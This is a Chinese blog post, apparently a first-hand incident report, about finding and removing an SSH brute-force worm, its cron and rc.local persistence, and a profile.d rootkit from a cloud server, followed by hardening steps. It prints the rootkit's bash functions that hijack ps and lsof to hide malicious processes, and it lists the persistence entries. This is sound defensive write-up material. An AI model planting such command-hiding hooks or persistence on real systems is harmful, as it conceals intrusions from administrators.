---
title: 'SSH 爆破与 Rootkit 清除实录'
publishDate: 2026-06-15
description: '记录了一次完整的服务器安全应急响应过程：从发现异常资源占用，到定位 SSH 爆破蠕虫、Rootkit 后门，再到彻底清除所有恶意组件'
slug: 'ssh-bao-po-yu-rootkit-qing-chu-shi-lu'
tags:
  - 服务器
  - 总结
language: '中文'
category: 总结
---

# SSH 爆破与 Rootkit 清除实录

## 一.事件起因：诡异的资源占用

### 1.1 发现问题

今天登录服务器后，发现系统资源占用异常：

- **内存使用率高达 98%**（3.6GB / 3.7GB）
- **CPU 负载高居不下**
- 但我的所有 Docker 项目明明已经全部暂停了

### 1.2 初步诊断

通过宝塔面板的系统监控和 `top` 命令，我定位到了一个可疑进程：

```bash
PID USER     %CPU %MEM COMMAND
1058 root     41.9 71.5 /go/cx 3000
```

这个名为 `/go/cx` 的进程单独占用了 **41.9% 的 CPU 和 71.5% 的内存**（约 2.6GB）。初步判断这绝非正常程序。

## 二.深入调查：恶意程序的伪装

### 2.1 文件基本信息

首先检查文件的基本属性：

```bash
$ ls -lh /go/cx
-rwxrwxrwx 1 root root 6.7M Jun 14 11:04 /go/cx

$ file /go/cx
/go/cx: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=..., stripped
```

几个关键疑点：

| 特征        | 分析                             |
| ----------- | -------------------------------- |
| 权限 0777   | 异常开放，任何用户都可执行       |
| 静态编译    | 不依赖外部库，方便跨机器传播     |
| stripped    | 符号表被剥离，增加分析难度       |
| Go 语言编写 | 编译后为单一可执行文件，便于隐藏 |

### 2.2 网络连接分析

通过 `ss` 命令检查该进程的网络连接，发现了令人震惊的结果：

```bash
$ ss -antp | grep cx | wc -l
4138    # 总连接数

$ ss -antp | grep cx | grep ESTAB | wc -l
1630    # 已建立的连接

$ ss -antp | grep cx | grep SYN-SENT | wc -l
2332    # 正在尝试连接的
```

**4138 个并发 SSH 连接**，目标端口全部是 22。这已经足够定性了——这是一个 SSH 暴力破解工具！

### 2.3 目标 IP 库

在 `/go/` 目录下还发现了一个更大的文件：

```bash
$ ls -lh /go/
-rw-rw-rw- 1 root root  27M Jun 14 11:07 ali.txt
-rwxrwxrwx 1 root root 6.7M Jun 14 11:04 cx

$ wc -l /go/ali.txt
1906630 /go/ali.txt    # 190 万个 IP 地址

$ head -5 /go/ali.txt
180.188.16.163
115.191.52.158
221.229.4.92
42.194.211.235
115.191.73.109
```

一个包含 **190 万个 IP 地址**的列表，全部作为爆破目标，个人推测文件名 `ali.txt` 暗示其目标主要是阿里云服务器（心理活动：这人到底经历了什么，拿我腾讯云服务器爆破阿里云服务器）

## 三.持久化机制：它如何做到"杀不死"

### 3.1 Crontab 定时任务

检查 root 用户的 crontab：

```bash
$ crontab -l
*/1 * * * * /go/cx 3000
```

**每分钟执行一次**——这就是为什么每次 kill 掉进程后，它又会重新出现。

继续检查 `/etc/crontab`（系统级 crontab），又发现了一个条目：

```bash
*/1 * * * * root /.mod
```

### 3.2 链式持久化

`/.mod` 是一个 bash 脚本：

```bash
$ cat /.mod
#!/bin/bash
/usr/lib/libgdi.so.0.8.2
```

它调用了 `/usr/lib/libgdi.so.0.8.2`—— 一个伪装成系统库文件的恶意程序

```bash
$ file /usr/lib/libgdi.so.0.8.2
/usr/lib/libgdi.so.0.8.2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=..., stripped
```

同样是 Go 语言静态编译的可执行文件，大小 5MB。伪装成 `libgdi.so.0.8.2`（GDI 图形库），但服务器上根本不需要这个库

### 3.3 开机自启

在 `/etc/rc.local` 中发现了开机自启动命令：

```bash
/go/cx 3000 &
```

三重持久化机制：

1. **用户级 crontab** → 每分钟重启 `/go/cx`
2. **系统级 crontab** → 每分钟启动 `/.mod` → `libgdi.so`
3. **开机自启** → `/etc/rc.local` 启动 `/go/cx`

---

## 四.Rootkit 的发现：命令为何"看不见"恶意进程

### 4.1 异常线索

在排查过程中，我注意到一个奇怪的现象：某些时候用 `ps aux` 查看进程，`/go/cx` 的内存占用显示为 0%。但通过 `/proc/1058/status` 直接读取，内存占用是 71.5%。

这让我怀疑系统命令可能被篡改了。

### 4.2 定位 Rootkit

检查 `/etc/profile.d/` 目录：

```bash
$ ls /etc/profile.d/
bash.cfg
gateway.sh
```

`bash.cfg` 是一个二进制文件，`gateway.sh` 是 shell 脚本。进一步分析 `bash.cfg` 的内容，发现了关键证据：

```bash
function ps {
  proc_name=$(/usr/bin/ps $@);
  proc_name=$(echo "$proc_name" | sed -e '/\/go\/cx/d');
  proc_name=$(echo "$proc_name" | sed -e '/libgdi.so.0.8.2/d');
  proc_name=$(echo "$proc_name" | sed -e '/\.mod/d');
  echo "$proc_name";
}

function lsof {
  proc_name=$(/usr/bin/lsof $@);
  proc_name=$(echo "$proc_name" | sed -e '/\/go\/cx/d');
  proc_name=$(echo "$proc_name" | sed -e '/libgdi.so.0.8.2/d');
  echo "$proc_name";
}
```

**这是一套完整的 Rootkit！** 它劫持了 `ps` 和 `lsof` 命令，通过 `sed` 过滤掉所有与恶意进程相关的输出，让管理员在常规检查中"看不见"恶意程序。

### 4.3 Rootkit 的工作原理

```
用户执行 ps aux
    ↓
Shell 加载 /etc/profile.d/bash.cfg
    ↓
调用被劫持的 ps 函数（而非真正的 /usr/bin/ps）
    ↓
真正的 ps 获取结果后，通过 sed 过滤掉 /go/cx、libgdi、.mod 等关键词
    ↓
返回"干净"的进程列表
    ↓
管理员以为系统安全 ✅（实际已被入侵）
```

这就是为什么我之前用 `ps aux` 看不到异常进程的原因——**不是进程不存在，而是命令被欺骗了**

## 五.攻击链还原

### 5.1 入侵时间线

根据日志分析，还原出完整的攻击时间线：

| 时间             | 事件                                      |
| ---------------- | ----------------------------------------- |
| 2026-06-13 20:52 | `/.mod` 脚本和 `libgdi.so` 被上传         |
| 2026-06-14 11:04 | `/go/cx` 和 `/go/ali.txt` 被上传          |
| 2026-06-14 11:04 | Crontab 定时任务、rc.local 开机自启被配置 |
| 2026-06-14 11:04 | Rootkit（bash.cfg + gateway.sh）被安装    |
| 2026-06-14 22:36 | 我发现异常，开始排查                      |

### 5.2 入侵方式

从 `auth.log` 中可以确认是通过 **SSH 暴力破解**：

```
2026-06-14T02:44:03 Failed password for invalid user ansible from 115.190.245.176
2026-06-14T02:49:48 Failed password for invalid user nvr from 115.190.245.176
2026-06-14T02:51:30 Failed password for root from 115.190.245.176
2026-06-14T02:53:11 Failed password for invalid user git from 115.190.245.176
...
```

攻击者使用字典对 `root`、`ansible`、`git`、`nvr` 等常见用户名进行密码爆破，最终成功登录并部署了全套恶意程序。

## 六.清除过程

### 6.1 终止恶意进程

```bash
pkill -9 -f cx
pkill -9 -f "/go/"
```

### 6.2 清除持久化机制

```bash
# 清除用户 crontab
crontab -l | grep -v '/go/cx' | crontab -

# 清除系统 crontab
sed -i '/\/\.mod/d' /etc/crontab

# 清除 rc.local
sed -i '/\/go\/cx/d' /etc/rc.local
```

### 6.3 删除恶意文件

```bash
rm -f /go/cx /go/ali.txt /.mod /usr/lib/libgdi.so.0.8.2
rm -f /etc/profile.d/bash.cfg /etc/profile.d/gateway.sh
```

### 6.4 验证清除结果

```bash
# 检查进程
$ ps aux | grep -iE "cx|/go/|libgdi|\.mod" | grep -v grep
# 无输出 ✅

# 检查文件
$ ls /go/cx /go/ali.txt /.mod /usr/lib/libgdi.so.0.8.2 /etc/profile.d/bash.cfg /etc/profile.d/gateway.sh
# ls: cannot access... No such file or directory ✅

# 检查 crontab
$ crontab -l | grep -iE "cx|/go/|\.mod|libgdi"
# 无输出 ✅

# 检查资源
$ free -h
               total        used        free      shared  buff/cache   available
Mem:           3.6Gi       736Mi       2.8Gi       1.7Mi       257Mi       2.9Gi
# 内存从 98% 降至 20% ✅

$ uptime
 22:58:47 up  1:01,  1 user,  0.14, 0.73, 1.62
# CPU 负载从 2.07 降至 0.14 ✅
```

## 七.恶意组件清单

| 序号 | 文件路径                    | 类型         | 大小  | 危害                                      |
| ---- | --------------------------- | ------------ | ----- | ----------------------------------------- |
| 1    | `/go/cx`                    | SSH 爆破蠕虫 | 6.7MB | 占用 71.5% 内存，4138 个并发 SSH 爆破连接 |
| 2    | `/go/ali.txt`               | 目标 IP 库   | 27MB  | 190 万个 IP 地址供爆破使用                |
| 3    | `/.mod`                     | 持久化脚本   | 36B   | 调用 libgdi.so 伪装程序                   |
| 4    | `/usr/lib/libgdi.so.0.8.2`  | 伪装库文件   | 5MB   | Go 编译的第二个恶意程序                   |
| 5    | `/etc/profile.d/bash.cfg`   | **Rootkit**  | 5MB   | 劫持 ps/lsof 命令，隐藏恶意进程           |
| 6    | `/etc/profile.d/gateway.sh` | Rootkit 组件 | 4.8KB | .配合 bash.cfg 实现命令劫持               |

## 八.我的后续防护加固

### 8.1 修改登录信息

1. **修改所有密码**：root、数据库、宝塔面板
2. **禁用 SSH 密码登录**，改用密钥认证：
   ```bash
   # 编辑 /etc/ssh/sshd_config
   PasswordAuthentication no
   systemctl restart sshd
   ```

### 8.2 长期防护

1. **✅ 已安装 fail2ban**，自动封禁爆破 IP
2. **定期更新系统**：`apt update && apt upgrade`
3. **监控资源使用**：设置告警阈值
4. **定期审计**：检查 crontab、rc.local、profile.d 等持久化点
5. **最小权限原则**：日常使用普通用户，避免 root 直连

## 九.总结

> 最后我还发现了，攻击者还给我开启了15g的虚拟内存，狠狠把我的磁盘都当内存使了，真的不敢想象，每分钟3000并非执行爆破190万个IP，第一轮一分钟的都还没执行完，第二轮定时任务又到了，无限执行爆破

这次事件是一次典型的 SSH 暴力破解入侵案例。攻击者利用弱密码进入服务器后，部署了完整的攻击链：

```
SSH 爆破 → 上传恶意程序 → 配置持久化 → 安装 Rootkit → 横向爆破
```

最值得注意的是 **Rootkit 的安装**——通过劫持 `ps` 和 `lsof` 命令，攻击者让恶意进程在常规检查中"隐身",这也提醒我：

- **不能只依赖 `ps` 命令检查进程**，必要时直接读取 `/proc/[pid]/status`
- **定期审计系统配置文件**，特别是 `/etc/profile.d/`、`/etc/crontab`、`/etc/rc.local`
- **SSH 密码认证是最大的安全隐患**，务必改用密钥认证

服务器安全无小事，及时发现、彻底清除、全面加固，才能守住数字世界的防线
